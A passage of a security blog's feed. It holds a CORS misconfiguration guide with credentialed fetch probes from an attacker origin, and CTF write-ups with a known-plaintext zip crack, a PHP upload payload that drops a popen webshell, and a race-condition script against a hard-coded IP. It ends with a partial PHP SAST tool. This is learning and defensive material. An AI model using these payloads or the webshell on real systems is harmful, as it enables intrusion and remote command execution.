X-User-Email</span><br></pre></td></tr></table></figure><p>危险性：<code>Expose-Headers</code> 允许跨域脚本读取原本受保护的响应头。如果这些头包含敏感信息（如 Authorization token 或自定义 session info），会被窃取。<br>检测（fetch）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://target.example/api/secret&#x27;</span>, &#123; <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(r.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Authorization&#x27;</span>)) &#125;)</span><br></pre></td></tr></table></figure><p>修复：不要把敏感 header 列在 <code>Access-Control-Expose-Headers</code> 中；仅暴露必要的非敏感头。</p><hr><h1 id="危险组合五：缺少-Vary-Origin-导致-CDN-缓存中毒"><a href="#危险组合五：缺少-Vary-Origin-导致-CDN-缓存中毒" class="headerlink" title="危险组合五：缺少 Vary: Origin 导致 CDN/缓存中毒"></a>危险组合五：<strong>缺少 Vary: Origin 导致 CDN/缓存中毒</strong></h1><p>请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br></pre></td></tr></table></figure><p>响应（危险）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com   // 动态回显</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">// **没有** Vary: Origin</span><br></pre></td></tr></table></figure><p>危险性：代理或 CDN 可能缓存带有回显 <code>Allow-Origin</code> 的响应并对其他用户返回同一缓存，造成<strong>跨用户的数据泄露或扩大攻击面</strong>。<br>检测（通过代理/CDN 配置与缓存行为测试）<br>修复：当动态返回 <code>Access-Control-Allow-Origin</code>，务必加 <code>Vary: Origin</code>；并确保 CDN 不缓存敏感动态响应（Cache-Control: private/no-store）。</p><hr><h1 id="危险组合六：-对预检允许任意-header（Access-Control-Allow-Headers-）"><a href="#危险组合六：-对预检允许任意-header（Access-Control-Allow-Headers-）" class="headerlink" title="危险组合六：*对预检允许任意 header（Access-Control-Allow-Headers: ）**"></a>危险组合六：*<em>对预检允许任意 header（Access-Control-Allow-Headers: </em>）**</h1><p>请求（预检）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: Authorization, X-Custom-Auth</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Headers: *   // 或列出 Authorization 等敏感头</span><br></pre></td></tr></table></figure><p>危险性：攻击者可以发送带任意敏感自定义头（例如伪造 Authorization）或触发更有力的请求。<br>修复：明确列出被允许的 header，避免 <code>*</code>，并在服务端对 header 值作严格校验。</p><hr><h1 id="危险组合七：允许-OPTIONS-预检-但不限制来源"><a href="#危险组合七：允许-OPTIONS-预检-但不限制来源" class="headerlink" title="危险组合七：允许 OPTIONS / 预检 但不限制来源"></a>危险组合七：<strong>允许 OPTIONS / 预检 但不限制来源</strong></h1><p>响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line">Access-Control-Allow-Headers: *</span><br></pre></td></tr></table></figure><p>危险性：预检放行所有方法与头会使攻击者能以任意复杂度发起跨域请求并读取响应（若同时允许凭证）。<br>修复：只允许实际使用的方法和头；对预检请求进行源白名单校验。</p><hr><h1 id="危险组合八：Set-Cookie-与回显-Origin-Allow-Credentials"><a href="#危险组合八：Set-Cookie-与回显-Origin-Allow-Credentials" class="headerlink" title="危险组合八：Set-Cookie 与回显 Origin / Allow-Credentials"></a>危险组合八：<strong>Set-Cookie 与回显 Origin / Allow-Credentials</strong></h1><p>请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br></pre></td></tr></table></figure><p>响应（危险）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Set-Cookie: session=...; HttpOnly; Secure; SameSite=None</span><br></pre></td></tr></table></figure><p>危险性：服务器在跨域响应中下发 cookie（且允许凭证），这可能使攻击者诱使浏览器在后续请求中发送该 cookie（会话劫持或持久化）。<br>修复：避免在跨站响应中设置敏感 cookie；如果必须，确保只在可信来源下设置并做严格验证。</p><hr><h1 id="危险组合九：Access-Control-Allow-Origin-回显任意-Origin，但没有-Allow-Credentials（仍可能泄露公共数据）"><a href="#危险组合九：Access-Control-Allow-Origin-回显任意-Origin，但没有-Allow-Credentials（仍可能泄露公共数据）" class="headerlink" title="危险组合九：Access-Control-Allow-Origin 回显任意 Origin，但没有 Allow-Credentials（仍可能泄露公共数据）"></a>危险组合九：<strong>Access-Control-Allow-Origin 回显任意 Origin，但没有 Allow-Credentials（仍可能泄露公共数据）</strong></h1><p>响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com   // 回显任意 Origin</span><br><span class="line">Access-Control-Allow-Credentials: false (或无)</span><br></pre></td></tr></table></figure><p>危险性：虽然不能带凭证，但若接口返回敏感数据（误将私人数据当公共数据返回），攻击者仍然能读取。<br>修复：区分公共 API 与敏感 API；敏感 API 不应回显任意 Origin。</p><hr><h1 id="辅助：攻击者常用的“请求头组合”用于探测与预检"><a href="#辅助：攻击者常用的“请求头组合”用于探测与预检" class="headerlink" title="辅助：攻击者常用的“请求头组合”用于探测与预检"></a>辅助：攻击者常用的“请求头组合”用于探测与预检</h1><ul><li>基本探测：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br></pre></td></tr></table></figure><ul><li>触发预检（测试复杂跨域权限）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: Authorization, X-Requested-With</span><br></pre></td></tr></table></figure><ul><li><p>测试是否会接受凭证/cookie：</p><ul><li>在攻击者页面使用 <code>fetch(..., &#123; credentials: &#39;include&#39; &#125;)</code> 发真实请求（浏览器行为决定是否发送 cookie）；同时用 curl 带 Origin 看响应头。</li></ul></li><li><p>测试是否能读取特定 header：</p><ul><li>请求后看 <code>Access-Control-Expose-Headers</code> 包含什么。</li></ul></li></ul><hr><h1 id="快速检测脚本（curl-fetch-POC）"><a href="#快速检测脚本（curl-fetch-POC）" class="headerlink" title="快速检测脚本（curl + fetch POC）"></a>快速检测脚本（curl + fetch POC）</h1><ol><li>用 curl 看响应头（初筛）：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Origin: https://attacker.com&quot;</span> https://target.example/api/secret</span><br></pre></td></tr></table></figure><ol><li>若返回 <code>Access-Control-Allow-Origin</code> 并且可能有 <code>Allow-Credentials: true</code>，在 attacker.com 的浏览器控制台试：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://target.example/api/secret&#x27;</span>, &#123; <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(t)).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(e));</span><br></pre></td></tr></table></figure><p>若能拿到 body，就是真实可利用漏洞。</p><hr><h1 id="总结与防护要点（一眼清单）"><a href="#总结与防护要点（一眼清单）" class="headerlink" title="总结与防护要点（一眼清单）"></a>总结与防护要点（一眼清单）</h1><ul><li>危险组合的核心：<strong>回显任意 Origin (<code>ACAO</code> 回显) + <code>Access-Control-Allow-Credentials: true</code> + 可读的响应体/头</strong>。这是最危险的一类。</li><li>其他危险：<code>ACAO: *</code> 对私有数据开放、<code>Allow-Headers: *</code> / <code>Allow-Methods: *</code> / 过度 <code>Expose-Headers</code>、缺 <code>Vary: Origin</code> 等都能放大问题或绕过保护。</li><li>修复总策略：<strong>白名单 Origin + 不对敏感接口使用 <code>*</code> + 当允许凭证时只返回具体可信域 + 加 <code>Vary: Origin</code> + 限制 Methods/Headers/Expose-Headers 并在服务端做严格授权验证</strong>。</li></ul><hr><p>如果你想，我可以接着做两件事（任选其一）：</p><ol><li>把上面所有<strong>危险组合</strong>整理成一张便于复测的清单（CSV 或表格），包含检测 curl 命令与风险等级；</li><li>帮你审查某个站点的真实响应头 —— 你把 <code>curl -i -H &quot;Origin: https://attacker.com&quot; https://target/...</code> 的输出贴上来，我直接指出哪些头造成漏洞并给出精确修复代码/配置（比如 Nginx、Express、Spring Boot 的示例）。</li></ol><p>你想先要哪一个？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;cors&quot;&gt;&lt;a href=&quot;#cors&quot; class=&quot;headerlink&quot; title=&quot;cors&quot;&gt;&lt;/a&gt;cors&lt;/h1&gt;&lt;p&gt;所谓cors其实就是浏览器的跨站请求协议&lt;br&gt;cors和csrf的区别就是一个是利用img等标签来操控用户行为看不到其返回</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ccb</title>
    <link href="https://lisien11.xyz/2025/09/14/ccb/"/>
    <id>https://lisien11.xyz/2025/09/14/ccb/</id>
    <published>2025-09-14T06:58:20.000Z</published>
    <updated>2025-09-14T07:00:55.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h1><img src="/2025/09/14/ccb/IMG_20250914-145903152.png" class="">  <img src="/2025/09/14/ccb/IMG_20250914-145924110.png" class="">  <p>长按FN进入调试模式<br><img src="/2025/09/14/ccb/IMG_20250914-150012409.png" class=""><br><img src="/2025/09/14/ccb/IMG_20250914-150032647.png" class=""><br>使用read读取文件<br><img src="/2025/09/14/ccb/IMG_20250914-150054799.png" class="">  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文曲签学&quot;&gt;&lt;a href=&quot;#文曲签学&quot; class=&quot;headerlink&quot; title=&quot;文曲签学&quot;&gt;&lt;/a&gt;文曲签学&lt;/h1&gt;&lt;img src=&quot;/2025/09/14/ccb/IMG_20250914-145903152.png&quot; class=&quot;&quot;&gt;  </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>开源组件的危害</title>
    <link href="https://lisien11.xyz/2025/09/06/%E5%BC%80%E6%BA%90%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8D%B1%E5%AE%B3/"/>
    <id>https://lisien11.xyz/2025/09/06/%E5%BC%80%E6%BA%90%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8D%B1%E5%AE%B3/</id>
    <published>2025-09-06T06:22:14.000Z</published>
    <updated>2025-09-06T06:33:54.678Z</updated>
    
    <content type="html"><![CDATA[<p><img src="image-27.png" alt="alt text"><br>压缩包说压缩备份的密码很强<br>所以猜猜其为明文爆破<br>而题目说这个是开源组件那么就再GitHub上找</p><p>最终找到这个为onenav的beta 0.9.12<br>然后将favicon.ico和.htaccess index.php进行压缩<br>然后明文爆破</p><p><img src="image-28.png" alt="alt text"></p><p>直接停止就会自动下载无需密码的压缩包<br><img src="image-31.png" alt="alt text"></p><p>解压后看config.php。</p><p><img src="image-29.png" alt="alt text"></p><p>然后rot13一下<br><img src="image-30.png" alt="alt text"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;image-27.png&quot; alt=&quot;alt text&quot;&gt;&lt;br&gt;压缩包说压缩备份的密码很强&lt;br&gt;所以猜猜其为明文爆破&lt;br&gt;而题目说这个是开源组件那么就再GitHub上找&lt;/p&gt;
&lt;p&gt;最终找到这个为onenav的beta 0.9.12&lt;br&gt;然后将</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>黑盾</title>
    <link href="https://lisien11.xyz/2025/09/06/%E9%BB%91%E7%9B%BE/"/>
    <id>https://lisien11.xyz/2025/09/06/%E9%BB%91%E7%9B%BE/</id>
    <published>2025-09-06T06:03:28.000Z</published>
    <updated>2025-09-06T06:11:53.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><img src="/2025/09/06/%E9%BB%91%E7%9B%BE/IMG_20250906-140443583.png" class="">  <p>上传php的时候发现其回显为删除那么就有可能是上传后检查再删除，，即可以尝试条件竞争<br><img src="/2025/09/06/%E9%BB%91%E7%9B%BE/IMG_20250906-140414757.png" class=""><br>观察成功上传的jpg文件可以发现其重命名的文件名是date的md5值，而date是服务器的时间。再请求的Date响应头转换一下即可</p><p>而上传的文件内容也有过滤但是是关键词过滤&lt;?php使用&lt;?=然后后门出现php就直接拼接即可<br>那么上传写入文件的payload如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;LSE.ph&#x27;</span>.<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;&lt;?= var_dump(fread(popen($_POST[1], &quot;r&quot;), 1000)); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后再phpinfo.php可以发现其禁用了很多函数，但是没有禁用popen所以可以使用popen绕过</p><p>然后就是条件竞争了<br><img src="image-24.png" alt=""><br>bp不断发文件上传的包，然后有py写脚本访问文件脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> parsedate_to_datetime</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">url_phpinfo = <span class="string">&quot;http://119.233.150.146:32903/aa&quot;</span></span><br><span class="line">base_url = <span class="string">&quot;http://119.233.150.146:32903/uploads/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Step 1: 获取服务时间</span></span><br><span class="line">        r = requests.get(url_phpinfo)</span><br><span class="line">        date_header = r.headers.get(<span class="string">&quot;Date&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> date_header:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 响应头没有 Date&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        service_time = parsedate_to_datetime(date_header)</span><br><span class="line">        <span class="comment"># 计算 3 秒后的时间</span></span><br><span class="line">        target_time = service_time + timedelta(seconds=<span class="number">3</span>)</span><br><span class="line">        time_str = target_time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)</span><br><span class="line">        md5_hash = hashlib.md5(time_str.encode()).hexdigest()</span><br><span class="line">        url_target = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span><span class="subst">&#123;md5_hash&#125;</span>.php&quot;</span>+<span class="string">f&quot;?haha=var_dump(1);&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 服务时间: <span class="subst">&#123;service_time&#125;</span> | 发送未来 3 秒时间: <span class="subst">&#123;time_str&#125;</span> -&gt; <span class="subst">&#123;url_target&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2: 不断发送直到经过 3 秒（不 sleep）</span></span><br><span class="line">        start_loop = time.time()</span><br><span class="line">        <span class="keyword">while</span> time.time() - start_loop &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2 = requests.get(url_target)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[&gt;] 尝试 <span class="subst">&#123;time_str&#125;</span> -&gt; <span class="subst">&#123;url_target&#125;</span> (状态码 <span class="subst">&#123;r2.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> r2.status_code == <span class="number">500</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="number">11111</span>)</span><br><span class="line">                    <span class="built_in">print</span>(r2.text)</span><br><span class="line">                <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到文件: <span class="subst">&#123;url_target&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(r2.text)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 3 秒已过，重新获取服务时间，开始新一轮...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="image-25.png" alt=""><br>竞争到后访问LSE.php然后命令执行就好了<br><img src="image-26.png" alt="alt text"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot; &quot;&gt;&lt;/a&gt; &lt;/h1&gt;&lt;img src=&quot;/2025/09/06/%E9%BB%91%E7%9B%BE/IMG_20250906-140443583.png&quot; class=&quot;&quot;&gt; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SAST</title>
    <link href="https://lisien11.xyz/2025/09/02/SAST/"/>
    <id>https://lisien11.xyz/2025/09/02/SAST/</id>
    <published>2025-09-02T00:20:05.000Z</published>
    <updated>2025-09-03T10:14:52.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>先写一个简单的寻找危险函数的AST然后打补丁，提取出这个危险函数的参数，通过正则来判断这个参数的师傅是拼接或者直接通过AST来判断，对可以直接通过AST判断，当参数全为常数时没有当参数中出现了变量时其存在。</p><p>然后再打补丁来判断这个参数是否可控，目前没有看到怎么通过AST来向上寻找参数，个人目前的想法是通过，将所有可控参数都进行记录，当发现了$_GET,$_POST这种时将其记录为一条赋值链，结构是双头链表或者其他可以向上查询的，这样子当再危险函数中发现了参数时只要查找是否再链中就可以确定其是否存在sql注入。</p><h1 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> phply <span class="keyword">import</span> phplex</span><br><span class="line"><span class="keyword">from</span> phply.phpparse <span class="keyword">import</span> make_parser</span><br><span class="line"><span class="keyword">from</span> phply <span class="keyword">import</span> phpast <span class="keyword">as</span> php</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PHPASTAuditor</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.lexer = phplex.lexer.clone()</span><br><span class="line">        self.parser = make_parser()</span><br><span class="line">        self.danger_functions = [</span><br><span class="line">            <span class="string">&#x27;mysql_query&#x27;</span>, <span class="string">&#x27;mysqli_query&#x27;</span>, <span class="string">&#x27;pg_query&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">        self.sql_keywords = [<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;drop&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_php_code</span>(<span class="params">self, code</span>):</span><br><span class="line">        <span class="keyword">return</span> self.parser.parse(code, lexer=self.lexer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_func_name</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取函数名，如果是字符串就返回&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, php.FunctionCall):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(node.name, <span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> node.name.name</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node.name, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">return</span> node.name</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_danger_function</span>(<span class="params">self, node</span>):</span><br><span class="line">        name = self.get_func_name(node)</span><br><span class="line">        <span class="keyword">return</span> name <span class="keyword">in</span> self.danger_functions <span class="keyword">if</span> name <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">contains_user_variable</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        检查节点是否包含变量（非常量）</span></span><br><span class="line"><span class="string">        支持：</span></span><br><span class="line"><span class="string">        - Parameter 节点</span></span><br><span class="line"><span class="string">        - BinaryOp 拼接</span></span><br><span class="line"><span class="string">        - 单个变量</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 如果节点是 Parameter，取内部节点</span></span><br><span class="line">        <span class="keyword">if</span> node.__class__.__name__ == <span class="string">&#x27;Parameter&#x27;</span> <span class="keyword">and</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;node&#x27;</span>):</span><br><span class="line">            node = node.node</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 节点是变量</span></span><br><span class="line">        <span class="keyword">if</span> node.__class__.__name__ == <span class="string">&#x27;Variable&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># BinaryOp 拼接</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;left&#x27;</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;right&#x27;</span>) <span class="keyword">and</span> <span class="built_in">getattr</span>(node, <span class="string">&#x27;op&#x27;</span>, <span class="string">&#x27;&#x27;</span>) == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.contains_user_variable(node.left) <span class="keyword">or</span> self.contains_user_variable(node.right)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 其他类型不算变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit_node</span>(<span class="params">self, node</span>):</span><br><span class="line">        findings = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查危险函数调用</span></span><br><span class="line">        <span class="keyword">if</span> self.is_danger_function(node):</span><br><span class="line">            name = self.get_func_name(node)</span><br><span class="line">            findings.append(<span class="string">f&quot;Dangerous function call: <span class="subst">&#123;name&#125;</span> at line <span class="subst">&#123;<span class="built_in">getattr</span>(node, <span class="string">&#x27;lineno&#x27;</span>, <span 